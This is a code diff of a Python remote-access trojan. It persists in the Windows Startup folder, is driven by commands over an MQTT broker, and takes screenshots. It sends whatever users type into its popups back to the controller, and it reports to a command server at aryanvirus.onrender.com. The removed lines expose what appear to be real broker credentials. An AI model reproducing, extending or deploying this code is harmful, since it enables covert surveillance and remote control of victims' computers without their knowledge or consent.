@@ -10,6 +10,7 @@ import subprocess
 import webbrowser
 import requests
 import shutil
+import ctypes
 from pathlib import Path
 import sys
 import traceback
@@ -54,13 +55,11 @@ def set_flag_on_server(state: bool):
     if ID_FILE.exists():
         with open(ID_FILE) as f:
             pcid = f.read().strip()
-    else:return     
-    """Optional: set this PC's flag remotely (if needed)"""
     try:
-        requests.get(f"{FLAG_URL}?pc_id={pcid}&state={'true' if state else 'false'}", timeout=10)
+        requests.get(f"{FLAG_URL}?pc_id={pcid}&state={'true' if state else 'false'}", timeout=30)
         print(f"[FLAG] Server flag for {pcid} set to {state}")
     except Exception as e:
-        print(f"[FLAG] Error setting flag: {e}")        
+        print(f"[FLAG] Error setting flag: {e}")                
 
 if not FLAG_FILE.exists():
     add_to_startup()
@@ -71,11 +70,7 @@ nFlag = False
 if N_FLAG_FILE.exists():
     nFlag = True    
 
-serverUrl = "https://aryanvirus.onrender.com"
-BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com"
-PORT = 8883
-USERNAME = "aryanvish2006"
-PASSWORD = "aryanvishvishalyadav"
+#PrivateCredentials
 
 
 if ID_FILE.exists():
@@ -116,7 +111,8 @@ def take_screenshot():
 def deleteScript():
 
     startup_path = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
-    file_to_delete = os.path.join(startup_path, "client.exe") 
+    file_to_delete = os.path.join(startup_path, "nayra.exe") 
+
     if os.path.exists(file_to_delete):
         os.remove(file_to_delete)
     if os.path.exists(FLAG_FILE):
@@ -128,6 +124,8 @@ def deleteScript():
         os.remove(ID_FILE)  
     if os.path.exists(BROKER_FILE):
         os.remove(BROKER_FILE)  
+    if os.path.exists(LOCAL_FLAG_FILE):
+        os.remove(LOCAL_FLAG_FILE)      
     client.publish(ACK_TOPIC,f"DELETED EVERYTHING FROM PC :{pc_id}")          
 
 def deleteFlag():
@@ -154,8 +152,10 @@ def alertPrompt(text):
     pg.alert(text)
 
 def inputPrompt(text):
-    value = pg.prompt(text, " : ")
-    return "Received = " + str(value)     
+    value = pg.prompt(text, "Input Required")
+    if value is None:
+        client.publish(ACK_TOPIC,f"Cancelled [{pc_id}]")
+    client.publish(ACK_TOPIC,f"Input Of [{pc_id}] --> {value}")
 
 # Handle all messages
 def handle_msg(msg):
@@ -246,7 +246,7 @@ def handle_msg(msg):
             idkey = msg[len("changeid "):]
             with open(ID_FILE,"w") as f:
                 f.write(idkey)
-            requests.get(f"{FLAG_URL}/delete?pc_id={pc_id}", timeout=15)   
+            requests.get(f"https://aryanvirus.onrender.com/mqtt_flag/delete?pc_id={pc_id}", timeout=15)   
             set_flag_on_server(True)   
             client.publish(ACK_TOPIC, f"Changed Id To :{idkey}")     
 
@@ -262,10 +262,7 @@ def handle_msg(msg):
 
         elif msg.startswith("inputprompt"):
             text = msg[len("inputprompt "):]
-            def handle_input():
-                value = inputPrompt(text)
-                client.publish(ACK_TOPIC,f"{pc_id} : {value}")
-            safe_thread(handle_input)
+            safe_thread(inputPrompt,text)
         elif msg.startswith("playtone"):
             parts = msg[len("playtone "):].split()
             if len(parts) == 2:
@@ -507,10 +504,11 @@ client.reconnect_delay_set(min_delay=1,max_delay=60)
 delay = 5
 while True:
     try:
-        client.connect(BROKER, PORT, 300)
+        client.connect(BROKER, PORT, 60)
         print("MQTT connected successfully.")
+        delay =5
         if nFlag:
-            requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
+            requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected",timeout=30)
         break
     except Exception as e:
         # print(f"MQTT connection failed: {e}, retrying in {delay}...")
@@ -532,7 +530,7 @@ def heartbeat_loop():
 def get_flag_from_server():
     try:
         url = f"{FLAG_URL}?pc_id={pc_id}"
-        resp = requests.get(url, timeout=5)
+        resp = requests.get(url, timeout=20)
         if resp.status_code != 200:
             print(f"[FLAG] bad status {resp.status_code}")
             return None
@@ -575,6 +573,7 @@ if not LOCAL_FLAG_FILE.exists():
 
 
 flag = get_flag_from_server()
+set_flag_on_server(flag)
 
 if flag is None:
     print("No internet — checking local flag.")
@@ -585,7 +584,7 @@ if flag is None:
 if not flag:
     print("Flag disabled by server — stopping script.")
     save_local_flag(False)
-    os._exit(0)  # 🛑 stop script completely
+    os._exit(0) 
 
 # Otherwise, connect
 save_local_flag(True)
